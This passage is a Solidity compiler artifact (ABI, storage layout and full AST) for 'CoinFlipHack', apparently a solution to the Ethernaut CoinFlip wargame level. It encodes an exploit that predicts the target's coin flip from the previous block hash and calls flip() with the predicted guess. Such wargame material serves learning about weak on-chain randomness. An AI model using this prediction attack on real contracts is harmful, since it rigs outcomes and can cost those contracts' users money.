					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_coinFlip\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"flipHack\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut/CoinFlipHack.sol\":\"CoinFlipHack\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut/CoinFlipHack.sol\":{\"keccak256\":\"0x794cafacb66f330aa080a1ba5c6457fd1d450e3d9048cbaed0b5dbe0b0d0c7b4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://9074dd55fbd0d9ebf153cec2e40f616b3fcdd445a67b42031a3f92189db0b2ac\",\"dweb:/ipfs/QmYDoCMRgn5kZS4TXBWg6cSBM8juCvMqqjbviowsfVBnxA\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 11,
								"contract": "ethernaut/CoinFlipHack.sol:CoinFlipHack",
								"label": "lastHash",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 14,
								"contract": "ethernaut/CoinFlipHack.sol:CoinFlipHack",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 17,
								"contract": "ethernaut/CoinFlipHack.sol:CoinFlipHack",
								"label": "coinFlipContract",
								"offset": 0,
								"slot": "2",
								"type": "t_contract(CoinFlip)9"
							}
						],
						"types": {
							"t_contract(CoinFlip)9": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"ethernaut/CoinFlipHack.sol": {
				"ast": {
					"absolutePath": "ethernaut/CoinFlipHack.sol",
					"exportedSymbols": {
						"CoinFlip": [
							9
						],
						"CoinFlipHack": [
							80
						]
					},
					"id": 81,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".18"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlip",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 9,
							"linearizedBaseContracts": [
								9
							],
							"name": "CoinFlip",
							"nameLocation": "68:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "1d263f67",
									"id": 8,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "94:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "104:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 8,
												"src": "99:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "99:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "98:13:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 8,
												"src": "130:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 5,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "130:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "129:6:0"
									},
									"scope": 9,
									"src": "85:51:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 81,
							"src": "58:80:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlipHack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 80,
							"linearizedBaseContracts": [
								80
							],
							"name": "CoinFlipHack",
							"nameLocation": "149:12:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 11,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "177:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 80,
									"src": "169:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "169:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 14,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "200:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 80,
									"src": "192:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 12,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "192:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "209:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 17,
									"mutability": "mutable",
									"name": "coinFlipContract",
									"nameLocation": "302:16:0",
									"nodeType": "VariableDeclaration",
									"scope": 80,
									"src": "293:25:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$9",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 16,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 15,
											"name": "CoinFlip",
											"nameLocations": [
												"293:8:0"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 9,
											"src": "293:8:0"
										},
										"referencedDeclaration": 9,
										"src": "293:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$9",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "357:55:0",
										"statements": [
											{
												"expression": {
													"id": 26,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 22,
														"name": "coinFlipContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 17,
														"src": "367:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$9",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 24,
																"name": "_coinFlip",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "395:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 23,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "386:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$9_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 25,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "386:19:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$9",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "367:38:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$9",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 27,
												"nodeType": "ExpressionStatement",
												"src": "367:38:0"
											}
										]
									},
									"id": 29,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 19,
												"mutability": "mutable",
												"name": "_coinFlip",
												"nameLocation": "346:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 29,
												"src": "338:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 18,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "338:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "337:19:0"
									},
									"returnParameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "357:0:0"
									},
									"scope": 80,
									"src": "325:87:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 78,
										"nodeType": "Block",
										"src": "460:303:0",
										"statements": [
											{
												"assignments": [
													35
												],
												"declarations": [
													{
														"constant": false,
														"id": 35,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "478:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 78,
														"src": "470:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 34,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "470:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 45,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 42,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 39,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "509:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 40,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberLocation": "515:6:0",
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "509:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 41,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "524:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "509:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 38,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "499:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 43,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "499:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 37,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "491:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 36,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "491:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 44,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "491:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "470:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 48,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 46,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "542:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 47,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "554:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "542:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 53,
												"nodeType": "IfStatement",
												"src": "538:61:0",
												"trueBody": {
													"id": 52,
													"nodeType": "Block",
													"src": "566:33:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 49,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "580:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 50,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "580:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 51,
															"nodeType": "ExpressionStatement",
															"src": "580:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 56,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 54,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "605:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 55,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "616:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "605:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 57,
												"nodeType": "ExpressionStatement",
												"src": "605:21:0"
											},
											{
												"assignments": [
													59
												],
												"declarations": [
													{
														"constant": false,
														"id": 59,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "640:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 78,
														"src": "632:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 58,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "632:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 63,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 62,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 60,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "651:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 61,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "664:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "651:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "632:38:0"
											},
											{
												"assignments": [
													65
												],
												"declarations": [
													{
														"constant": false,
														"id": 65,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "681:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 78,
														"src": "676:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 64,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "676:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 72,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 68,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 66,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 59,
															"src": "688:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 67,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "700:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "688:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 70,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "711:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 71,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "688:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 69,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "704:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "676:40:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 75,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 65,
															"src": "751:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 73,
															"name": "coinFlipContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 17,
															"src": "729:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$9",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 74,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "746:4:0",
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 8,
														"src": "729:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 76,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "729:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 33,
												"id": 77,
												"nodeType": "Return",
												"src": "722:34:0"
											}
										]
									},
									"functionSelector": "cb80c044",
									"id": 79,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flipHack",
									"nameLocation": "427:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "435:2:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 79,
												"src": "455:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 31,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "455:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "454:6:0"
									},
									"scope": 80,
									"src": "418:345:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 81,
							"src": "140:625:0",
							"usedErrors": []
						}
					],
					"src": "32:733:0"
				},
				"id": 0
			}
		}
	}
}